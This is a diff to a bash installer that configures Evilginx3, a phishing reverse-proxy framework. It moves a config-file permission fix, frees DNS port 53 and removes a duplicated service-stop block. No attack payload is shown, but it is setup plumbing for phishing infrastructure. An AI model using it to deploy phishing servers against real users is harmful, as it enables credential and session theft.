@@ -535,10 +535,6 @@ start_service() {
 configure_evilginx_integration() {
     log "Configuring Evilginx3 integration..."
 
-    # Ensure config.yaml has correct permissions
-    chmod 600 "$EVILGINX_DIR/config.yaml"
-
-
     # 1. Resolve Port 53 conflict (systemd-resolved)
     if grep -q "DNSStubListener=yes" /etc/systemd/resolved.conf || ! grep -q "DNSStubListener" /etc/systemd/resolved.conf; then
         log "Disabling systemd-resolved stub listener to free port 53..."
@@ -557,6 +553,9 @@ configure_evilginx_integration() {
         sed -e "s/{{.Domain}}/$DOMAIN/g" \
             -e "s/{{.VpsIp}}/$VPS_IP/g" \
             "$INSTALL_DIR/templates/evilginx.yaml.tmpl" > "$EVILGINX_DIR/config.yaml"
+            
+        # Ensure config.yaml has correct permissions after creation
+        chmod 600 "$EVILGINX_DIR/config.yaml"
     fi
 
     # Copy certificates for Evilginx3
@@ -615,18 +614,6 @@ EOF
     # Configure using evilginx v3 commands
     log "Configuring Evilginx3 settings..."
     
-    # 1. Resolve Port 53 conflict (systemd-resolved)
-    if grep -q "DNSStubListener=yes" /etc/systemd/resolved.conf || ! grep -q "DNSStubListener" /etc/systemd/resolved.conf; then
-        log "Disabling systemd-resolved stub listener to free port 53..."
-        mkdir -p /etc/systemd/resolved.conf.d
-        echo -e "[Resolve]\nDNSStubListener=no" > /etc/systemd/resolved.conf.d/evilginx.conf
-        systemctl restart systemd-resolved
-    fi
-
-    # 2. Temporarily stop Nginx and Evilginx to prevent bind errors during config
-    systemctl stop nginx evilginx 2>/dev/null || true
-    sleep 2
-
     # Use expect for interactive configuration
     cat > /tmp/evilginx_config.exp << EOF
 #!/usr/bin/expect -f
